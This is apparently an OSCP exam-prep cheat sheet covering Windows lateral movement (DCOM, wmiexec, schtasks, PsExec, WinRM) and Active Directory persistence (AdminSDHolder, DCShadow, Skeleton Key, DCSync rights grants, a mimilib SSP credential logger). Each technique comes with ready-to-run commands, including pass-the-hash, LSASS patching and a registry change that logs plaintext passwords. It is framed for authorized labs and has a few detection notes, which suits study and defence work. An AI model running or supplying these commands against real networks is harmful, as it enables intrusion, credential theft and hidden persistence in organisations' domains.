# OSCP-Relevant Windows Lateral Movement & AD Persistence Techniques
*(Beyond mainstream Kerberos-ticket attacks — for authorized pentest/exam prep)*

---

## Part 1: Lateral Movement Techniques

### 1. DCOM Lateral Movement — MMC20.Application Abuse

**Explanation**
DCOM (Distributed Component Object Model) allows COM objects to be instantiated and invoked remotely over RPC (TCP 135, then a dynamic high port). If you hold local admin credentials on a target, you can remotely instantiate the `MMC20.Application` COM object and call its `Document.ActiveView.ExecuteShellCommand` method to run arbitrary commands — without dropping a service or using PsExec/WMI. This is stealthier than SMB-based techniques since it never touches ADMIN$ and doesn't create a Windows service, making it useful when EDR is watching for classic PsExec/WMI patterns.

**Command Example (PowerShell)**
```powershell
$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","10.10.10.5"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```
Other COM objects usable similarly: `ShellWindows`, `ShellBrowserWindow` (via `Document.Application.ShellExecute`).

**Requirements**: local admin on target, DCOM/RPC (135 + ephemeral range) reachable, `HKCU` remote registry connectivity for the initial object activation.

**Reference**: [Lateral Movement using the MMC20.Application COM Object — enigma0x3](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) · [ired.team — T1175 DCOM](https://www.ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model)

---

### 2. WMI-Based Remote Execution — wmiexec.py (Impacket)

**Explanation**
WMI (Windows Management Instrumentation) exposes a management interface over DCOM/RPC (port 135 + dynamic ports, or WinRM-wrapped WMI on 5985/5986). `wmiexec.py` from Impacket abuses `Win32_Process.Create` to spawn a process remotely, then redirects output through a temporary file written/read over SMB (or `-nooutput`/`-silentcommand` to avoid touching disk entirely). It gives a semi-interactive "shell" without installing a service binary, which is notably stealthier than PsExec since no service is created on the target and no binary is dropped to `ADMIN$` for execution itself (only transient output files, if used).

**Command Example**
```bash
# Password auth
wmiexec.py DOMAIN/administrator:'Password123!'@10.10.10.5

# Pass-the-hash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 administrator@10.10.10.5

# No output written to disk (stealthier)
wmiexec.py -nooutput DOMAIN/administrator:'Password123!'@10.10.10.5
```

**Requirements**: local admin on target, ports 135/tcp + dynamic RPC range (or 445 for the auxiliary SMB share used for output).

**Reference**: [impacket/examples/wmiexec.py — fortra/impacket (GitHub)](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) · [How to Detect and Prevent Impacket's Wmiexec — CrowdStrike](https://www.crowdstrike.com/en-us/blog/how-to-detect-and-prevent-impackets-wmiexec/) · [WADComs — Impacket WMIExec cheat sheet](https://wadcoms.github.io/wadcoms/Impacket-WMIExec/)

---

### 3. Scheduled-Task-Based Lateral Movement — `schtasks /create /s`

**Explanation**
`schtasks.exe` is a native LOLBin that can create, run, and delete tasks on a remote host over SMB/RPC using `/s` (target), authenticating with `/u`/`/p` (or the current token if already authenticated, e.g., via a PtH `runas` or SMB session). Because it's a signed, built-in Microsoft binary, it blends in with legitimate admin activity better than dropping custom executables, and it's a solid fallback when DCOM/WMI ports are filtered but SMB/RPC for the Task Scheduler service is open.

**Command Example**
```cmd
:: Create + trigger immediately (ONCE, backdated so it fires ASAP), then verify and clean up
schtasks /create /s 10.10.10.5 /u DOMAIN\administrator /p Password123! /tn "update" /tr "cmd /c calc.exe" /sc ONCE /sd 01/01/1970 /st 00:00 /ru SYSTEM
schtasks /run /s 10.10.10.5 /u DOMAIN\administrator /p Password123! /tn "update"
schtasks /delete /s 10.10.10.5 /u DOMAIN\administrator /p Password123! /tn "update" /f
```

**Requirements**: local admin on target, SMB (445) + RPC reachable to the Task Scheduler (ATSVC) endpoint. Impacket's `atexec.py` performs the equivalent programmatically (single-shot, no persistent task).

**Reference**: [Schtasks — LOLBAS Project](https://lolbas-project.github.io/lolbas/Binaries/Schtasks/) · [Schtask — ired.team T1053](https://www.ired.team/offensive-security/persistence/t1053-schtask) · [schtasks /create — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)

---

### 4. PsExec-Style Service Creation Lateral Movement

**Explanation**
The classic technique: authenticate over SMB (445) to `ADMIN$`, upload a service binary, use the Service Control Manager (SCM) API (`OpenSCManagerW` → `CreateServiceW` → `StartServiceW`) to register and start it as a Windows service running as SYSTEM, capturing I/O via a named pipe. This is what Sysinternals `PsExec.exe`, Impacket's `psexec.py`/`smbexec.py`, and CrackMapExec's `-x` option all replicate. It's the noisiest of the four (creates a service, drops a binary, generates Event ID 7045) but is the most reliable and yields SYSTEM by default.

**Command Example**
```bash
# Impacket psexec (drops/executes a service binary via ADMIN$)
psexec.py DOMAIN/administrator:'Password123!'@10.10.10.5

# smbexec (semi-fileless variant — uses cmd.exe as the service binary, no binary dropped)
smbexec.py DOMAIN/administrator:'Password123!'@10.10.10.5

# Native Sysinternals PsExec
PsExec.exe \\10.10.10.5 -u DOMAIN\administrator -p Password123! cmd.exe
```

**Requirements**: local admin, SMB (445) + RPC to SCM (135/49152+), write access to `ADMIN$`.

**Reference**: [PsExec — Windows Sysinternals, Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) · [impacket/examples/psexec.py — GitHub](https://github.com/fortra/impacket/blob/master/examples/psexec.py) · [Remote Code Execution Using Impacket — Hacking Articles](https://www.hackingarticles.in/remote-code-execution-using-impacket/)

**Faster (nxc):** `nxc smb <target> -u administrator -p Password123! -x "whoami"` (or `-X` for a PowerShell command) runs a command via the same wmiexec/atexec/smbexec/psexec methods without invoking separate scripts; force a specific method with `--exec-method wmiexec|smbexec|atexec`.

---

### 5. WinRM / PowerShell Remoting

**Explanation**
WinRM (Windows Remote Management, Microsoft's SOAP-based WS-Management implementation) listens on TCP 5985 (HTTP) / 5986 (HTTPS) and is enabled by default on Windows Server. Any account in the local `Administrators` or `Remote Management Users` group can open a remote PowerShell session. It is the single most-used remote-access vector in modern Windows/AD environments — arguably more common in practice than PsExec/WMI — since it requires no service creation or binary drop and gives a full interactive PowerShell runspace.

**Command Example**
```bash
# evil-winrm (Linux attacker box)
evil-winrm -i 10.10.10.5 -u administrator -p 'Password123!'
evil-winrm -i 10.10.10.5 -u administrator -H 9e730375b7cbcebf74ae46481e07b0c7   # pass-the-hash

# Native PowerShell Remoting (from a Windows host)
Enter-PSSession -ComputerName 10.10.10.5 -Credential DOMAIN\administrator
Invoke-Command -ComputerName 10.10.10.5 -Credential DOMAIN\administrator -ScriptBlock { whoami }
```

**Requirements**: account is a member of local `Administrators` or `Remote Management Users` on the target, WinRM service running and 5985/5986 reachable.

**Reference**: [evil-winrm — Hackplayers (GitHub)](https://github.com/Hackplayers/evil-winrm) · [Enter-PSSession — Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession) · [WinRM lateral movement — ired.team T1021.006](https://www.ired.team/offensive-security/lateral-movement/lateral-movement-with-psexec)

---

## Part 2: AD Persistence Concepts (Reference-Level — Defensive Understanding)

### 5. AdminSDHolder ACL Backdoor

**Explanation**
`AdminSDHolder` is a container object whose ACL is periodically (every 60 min by default) pushed onto all "protected" AD groups/accounts (Domain Admins, Enterprise Admins, etc.) by the SDProp process, to prevent accidental permission drift. An attacker with sufficient rights can add an ACE (e.g., `GenericAll`/`WriteDACL`) for an innocuous-looking low-privileged user onto `AdminSDHolder` itself. SDProp then automatically re-propagates that ACE to every protected principal on its next run — surviving admins removing the ACE from individual objects, since the "source of truth" (`AdminSDHolder`) still has it.

**Command Example (PowerView)**
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity 'lowpriv-user' -Rights All
```

**Reference**: [Backdooring AdminSDHolder for Persistence — ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) · [Domain Persistence – AdminSDHolder — pentestlab.blog](https://pentestlab.blog/2022/01/04/domain-persistence-adminsdholder/) · [Domain Persistence AdminSDHolder — Hacking Articles](https://www.hackingarticles.in/domain-persistence-adminsdholder/)

---

### 6. DCShadow

**Explanation**
With Domain/Enterprise Admin rights, `DCShadow` (via Mimikatz's `lsadump::dcshadow`) temporarily registers the attacker's machine as a rogue Domain Controller in AD's configuration partition, then pushes arbitrary attribute changes (e.g., SIDHistory, `msDS-KeyCredentialLink`, or backdoor ACLs) directly into the replication stream. Because the change arrives via legitimate DC-to-DC replication rather than an LDAP write, it bypasses normal audit logging (no 4662/5136 events) that would otherwise flag the modification, making it a stealthy way to plant or re-plant a backdoor.

**Command Example (Mimikatz, two instances/two consoles required)**
```
# Console 1 (needs SeDebugPrivilege as SYSTEM / DA)
mimikatz # lsadump::dcshadow /object=lowpriv-user /attribute=SIDHistory /value=S-1-5-21-...-512

# Console 2 (pushes the change into replication)
mimikatz # lsadump::dcshadow /push
```

**Reference**: [DCShadow Attack Explained — Picus Security (MITRE T1207)](https://www.picussecurity.com/resource/blog/dcshadow-attack-explained-mitre-attack-t120) · [dcshadow.com — official technique page (Delpy/Le Toux)](https://www.dcshadow.com/) · [lsadump::dcshadow — The Hacker Recipes](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcshadow)

---

### 7. Skeleton Key

**Explanation**
With Domain Admin rights and SeDebugPrivilege on a Domain Controller, Mimikatz's `misc::skeleton` patches the LSASS process in memory to make `MsvpPasswordValidate` accept a universal master password ("mimikatz" by default) for **any** domain account, in addition to that account's real password. It's purely an in-memory patch, so it doesn't touch NTDS.dit and does not survive a DC reboot — but while active it grants trivial re-entry as any user without needing per-account credentials.

**Command Example (Mimikatz, run on the DC as SYSTEM/DA)**
```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Afterward, authenticate as any domain user using the master password "mimikatz" against the affected DC.

**Reference**: [Attackers Can Now Use Mimikatz to Implant Skeleton Key on DCs — adsecurity.org](https://adsecurity.org/?p=1275) · [Skeleton key — The Hacker Recipes](https://www.thehacker.recipes/ad/persistence/skeleton-key/) · [Skeleton Key — Penetration Testing Lab](https://pentestlab.blog/2018/04/10/skeleton-key/)

---

### DCSync Backdoor Persistence (granting replication rights)
**Explanation:** With DA access, grant `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` ACEs to a low-privileged user — this user can then DCSync at will even after the DA account password is rotated, providing persistent domain-level access.
```bash
# Impacket dacledit (preferred for OSCP — Linux-native)
dacledit.py -action write -rights DCSync -principal lowprivuser -target-dn 'DC=domain,DC=local' domain.local/admin:pass -dc-ip <DC_IP>

# PowerView alternative (from a DA PowerShell session)
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity lowprivuser -Rights DCSync
```
**Detection/cleanup:** audit `nTSecurityDescriptor` on the domain root for unexpected replication ACEs; `Remove-DomainObjectAcl` or `dacledit.py -action remove` to clean up.

### Custom SSP Persistence (mimilib.dll)
**Explanation:** Loading a custom Security Support Provider (SSP) DLL into LSASS causes it to log all future authentication events (including plaintext passwords) to a file. This survives password rotations but NOT reboots unless the DLL is also registered in the registry.
```cmd
:: In-memory (does not survive reboot)
mimikatz # misc::memssp
:: Credentials logged to C:\Windows\System32\mimilsa.log

:: Persistent (survives reboot — register in registry)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f
:: Copy mimilib.dll to C:\Windows\System32\
:: After next reboot, all authentications are logged to C:\Windows\System32\mimilsa.log
```

---

## Summary Table

| Technique | Primary Port(s) | Artifact Created | Stealth vs. PsExec |
|---|---|---|---|
| MMC20.Application (DCOM) | 135 + dynamic RPC | None (no service/binary) | Higher |
| wmiexec.py (WMI) | 135 + dynamic RPC / 445 | Transient output file (optional) | Higher |
| schtasks /create /s | 445 + RPC (ATSVC) | Scheduled task (Event ID 4698/106) | Medium |
| PsExec-style (SCM) | 445 + RPC (SCM) | Service (Event ID 7045) + binary | Lowest |
| WinRM / PowerShell Remoting | 5985/5986 | None (no service/binary) | Higher |
| AdminSDHolder ACL backdoor | N/A (AD object write) | Persistent ACE, re-applied by SDProp | N/A (persistence, not LM) |
| DCShadow | N/A (replication) | Rogue DC registration (transient) | N/A (persistence, not LM) |
| Skeleton Key | N/A (in-memory LSASS patch) | None on disk; gone on reboot | N/A (persistence, not LM) |

**Note**: All five lateral-movement techniques require local Administrator equivalent rights (or, for WinRM, membership in `Administrators`/`Remote Management Users`) on the target and are intended strictly for use in authorized engagements/labs (OSCP exam network, HTB, etc.).
